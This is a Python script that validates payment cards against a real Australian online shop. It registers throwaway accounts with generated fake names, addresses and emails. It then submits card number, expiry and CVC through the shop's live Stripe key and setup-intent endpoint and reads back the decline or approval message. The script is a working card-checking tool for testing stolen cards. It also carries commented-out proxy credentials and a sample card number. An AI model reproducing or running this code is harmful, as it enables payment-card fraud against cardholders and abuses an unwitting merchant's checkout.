import random
import string
import requests
from user_agent import generate_user_agent
#from proxy import reqproxy, make_request
import json
import re

#============================================
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa", "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar", "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia", "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem", "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia", "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza", "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["London", "Birmingham", "Manchester", "Liverpool", "Leeds", "Glasgow", "Sheffield", "Edinburgh", "Bristol", "Cardiff"]
    states = ["England", "England", "England", "England", "England", "Scotland", "England", "Scotland", "England", "Wales"]
    streets = ["Baker St", "Oxford St", "High St", "King's Rd", "Abbey Rd", "The Strand", "Regent St", "Whitehall", "Fleet St", "Pall Mall"]
    zip_codes = ["SW1A 1AA", "W1D 3QF", "M1 1AE", "N1C 4AG", "EC1A 1BB", "SE1 8XX", "B1 1AA", "RG1 8DN", "SW1E 5RS", "B2 5DT"]
    
    city = random.choice(cities)
    street_address = f"{random.randint(1, 999)} {random.choice(streets)}"
    zip_code = random.choice(zip_codes)
    return street_address, city, "GB", zip_code, f"07{random.randint(100000000, 999999999)}"

def generate_email():
    return f"user{random.randint(10000,99999)}@example.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

def generate_random_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

#============================================
def Tele(ccx):
    #proxy_str = "proxy.insideproxy.net:3389:res-any:pgw-df6b371b8ec65c798929f20b1b3257302159d84a48d2a1d5"
    #session, ip = reqproxy(proxy_str)
    #print(f"IP Address: {ip}")
    session = requests.Session()
    ccx=ccx.strip()
    numbers = re.findall(r"\d+", ccx)
    n = mm = yy = cvc = ""
    if len(numbers) >= 4:
        n = numbers[0]
        mm = numbers[1]
        yy = numbers[2]
        cvc = numbers[3]
        mm = str(int(mm))
        if len(yy) == 4:
            yy = yy[-2:]


    user = generate_user_agent()
    r = requests.Session()
    r.verify = False
    
    first_name, last_name = generate_full_name()
    kaddress, city, country, postcode, phone =     generate_address()
    kaddress, city, country, postcode, phone = generate_address()
    email = generate_email()
    username = generate_username()
    corr = generate_random_code()
    sess = generate_random_code()
    nr = random.randint(100000, 999999)
    lr = random.randint(1000, 9999)

    headers = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    
    response = session.get('https://hendrahabits.com.au/my-account/add-payment-method/', headers=headers)
    
    register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
    print(register)
    
    headers = {
        'content-type': 'application/x-www-form-urlencoded',
        'referer': 'https://hendrahabits.com.au/my-account/add-payment-method/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        'email': f'rodamuser{nr}@gmail.com',
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': 'https://hendrahabits.com.au/my-account/add-payment-method/',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://hendrahabits.com.au/my-account/add-payment-method/',
        'wc_order_attribution_session_start_time': '2026-05-09 16:34:24',
        'wc_order_attribution_session_pages': '1',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'woocommerce-register-nonce': f'{register}',
        '_wp_http_referer': '/my-account/add-payment-method/',
        'register': 'Register',
    }
    
    response = session.post('https://hendrahabits.com.au/my-account/add-payment-method/', headers=headers, data=data)
    
    ajax = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', response.text).group(1)
    print(ajax)
    
    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=AU&payment_user_agent=stripe.js%2Fc891fde8fc%3B+stripe-js-v3%2Fc891fde8fc%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fhendrahabits.com.au&time_on_page=105109&guid=NA&muid=NA&sid=NA&key=pk_live_51Lv72tBTsguVbm1C8raLSY7GRZM7Ag7jHFBLzEBOtYP3lg53GRev8R3CZjJmv4la6iKCOn1UbOPgDvTbnb7GOaBB00QzUJtLnx'
    
    response = session.post('https://api.stripe.com/v1/payment_methods', data=data)
    
    pm = response.json()['id']
    print(pm)
    
    headers = {
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'referer': 'https://hendrahabits.com.au/my-account/add-payment-method/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        'action': 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method': f'{pm}',
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': f'{ajax}',
    }
    
    response = session.post('https://hendrahabits.com.au/wp-admin/admin-ajax.php',
    headers=headers,
    data=data,
)

    try:
        result = re.search(r'"message":"(.*?)"', response.text).group(1)
    except:
        result = re.search(r'"status":"(.*?)"', response.text).group(1)

    return result
    
#test_card = "5196032164892776|01|28|618"
#print(Tele(test_card))
